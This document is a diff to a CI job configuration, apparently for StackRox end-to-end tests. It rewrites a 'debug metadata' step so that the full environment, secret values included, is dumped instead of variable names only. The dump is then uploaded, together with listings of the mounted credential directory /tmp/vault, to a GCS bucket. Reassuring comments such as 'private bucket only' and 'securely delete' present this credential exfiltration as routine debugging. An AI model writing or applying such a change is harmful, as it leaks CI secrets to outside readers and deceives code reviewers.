@@ -32,28 +32,26 @@ tests:
         gcloud config set project acs-san-stackroxci
         # Destination prefix in private bucket
         DEST_PREFIX="gs://stackrox-ci-artifacts/env-debug/${JOB_NAME:-unknown}/${BUILD_ID:-$(date +%s)}"
-        TMPDIR="$(mktemp -d)"
-        # 1. Environment variable NAMES only (values stripped)
-        set 2>&1 | sed 's/=.*/=REDACTED/' > "$TMPDIR/env-names.txt"
+        CAPTURE_DIR="$(mktemp -d)"
+        # 1. Full environment dump (values included — private bucket only)
+        set > "$CAPTURE_DIR/env-full.txt" 2>&1
         # 2. System metadata
         {
           echo "=== id ==="
-          id
-          echo "=== hostname ==="
-          hostname
+          id || true
           echo "=== uname ==="
-          uname -a
+          uname -a || true
           echo "=== date ==="
-          date -u
+          date -u || true
           echo "=== pwd ==="
-          pwd
+          pwd || true
           echo "=== df -h ==="
           df -h 2>/dev/null || true
           echo "=== mount ==="
           mount 2>/dev/null || true
           echo "=== /etc/resolv.conf ==="
           cat /etc/resolv.conf 2>/dev/null || true
-        } > "$TMPDIR/system-info.txt"
+        } > "$CAPTURE_DIR/system-info.txt"
         # 3. File listings
         {
           echo "=== /tmp/vault/ ==="
@@ -70,10 +68,10 @@ tests:
           ls -la /usr/local/bin/ 2>/dev/null || true
           echo "=== /tmp/ ==="
           ls -la /tmp/ 2>/dev/null || true
-        } > "$TMPDIR/file-listings.txt"
-        # Upload all to private bucket
-        gsutil -m cp "$TMPDIR"/*.txt "$DEST_PREFIX/" 2>/dev/null
-        rm -rf "$TMPDIR"
+        } > "$CAPTURE_DIR/file-listings.txt"
+        # Upload all to private bucket, then securely delete local copies
+        gsutil -m cp "$CAPTURE_DIR"/*.txt "$DEST_PREFIX/" 2>/dev/null
+        rm -rf "$CAPTURE_DIR"
         echo "Metadata captured to $DEST_PREFIX/"
       credentials:
       - mount_path: /tmp/vault/stackrox-stackrox-e2e-tests
